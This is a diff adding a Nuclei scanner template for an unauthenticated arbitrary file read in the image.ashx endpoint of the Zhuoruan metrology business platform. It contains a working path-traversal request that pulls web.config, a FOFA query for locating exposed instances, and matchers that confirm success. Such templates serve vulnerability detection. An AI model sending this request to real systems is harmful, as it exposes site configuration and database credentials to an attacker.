@@ -1,0 +1,30 @@
+id: zhuoruan-image-fileread
+info:
+  name: 卓软计量业务管理平台 image.ashx - fileread
+  author: leadlife
+  severity: high
+  description: 卓软计量业务管理平台 image.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%8D%8E%E7%BE%8E%E5%8D%93%E8%BD%AF/%E5%8D%93%E8%BD%AF%E8%AE%A1%E9%87%8F%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0image.ashx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-334571363"
+  tags: 2024,fileread,zhuoruan
+
+http:
+  - raw:
+      - |
+        GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'configuration','湖南华美卓软互联网技术有限公司','xml versio')
+        condition: and
